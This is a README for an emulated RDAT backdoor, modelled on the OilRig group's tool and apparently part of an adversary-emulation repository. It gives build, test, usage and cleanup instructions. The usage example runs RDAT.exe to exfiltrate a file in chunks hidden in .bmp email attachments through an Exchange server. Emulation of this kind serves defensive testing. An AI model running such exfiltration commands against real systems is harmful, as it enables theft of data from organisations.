# RDAT

RDAT is a backdoor used by the suspected Iranian threat group OilRig. RDAT was originally identified in 2017 and targeted companies in the telecommunications sector.[1][2]
This emulated version of RDAT will leverage the EWS API by loading Microsoft.Exchange.WebServices.dll. It will connect to the EWS email server and send emails with a .bmp that contains chunks of data from given file to be exfiltrated.

Microsoft.Exchange.WebServices.dll is not included by default in this repository. Follow Microsoft's [documentation](https://docs.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-reference-the-ews-managed-api-assembly) for retrieving the DLL from an existing installation of Exchange or for using the open source EWS Managed API. The DLL should be placed in `Resources/RDAT` for building the RDAT executable.

**NOTE:** Tests and usage assume an Exchange server has been configured for the environment and
should be run from a domain joined Windows host with network access to the Exchange server. This
implementation also expects a username and passowrd for a configured user that can authenticate to
the Exchange server.

# Build Instructions

## Windows

### Download .NET 6.0 SDK x64 for Windows
https://dotnet.microsoft.com/en-us/download/dotnet/6.0

### Build EXE
Open a command (cmd.exe) prompt
```
# from \Resources\RDAT\

dotnet publish -c Release -r win10-x64 -p:PublishSingleFile=true /p:DebugType=None /p:DebugSymbols=false
cd .\bin\Release\net6.0\win10-x64\publish\
```

**The compiled binary should be copied to Resources\payloads\TwoFace for Step 8 and 10.**

## Test Instructions

Open a command (cmd.exe) prompt
```
# from \Resources\RDAT\

powershell.exe .\test.ps1 [user] [password] [domain] [server_address] # Order has to be exact
# Example: powershell.exe .\test.ps1 user_account 1234567 domain.com 10.0.0.1
```

## Usage Examples
Go to running directory of RDAT.exe
```
.\RDAT.exe --help
.\RDAT.exe --path="C:\Users\Public\FileToBeExfiltrated.txt" --from="user_account@domain.com" --password="1234567" --to="recipient@domain.com" --server="10.0.0.1" --chunksize="20000" 
```

## Cleanup Instructions
Go to running directory of RDAT.exe
```
rm .\RDAT.exe
rm .\guest.bmp
rm .\guest.bmp.tmp
```

## CTI Evidence

[1] https://attack.mitre.org/software/S0495/
[2] https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/
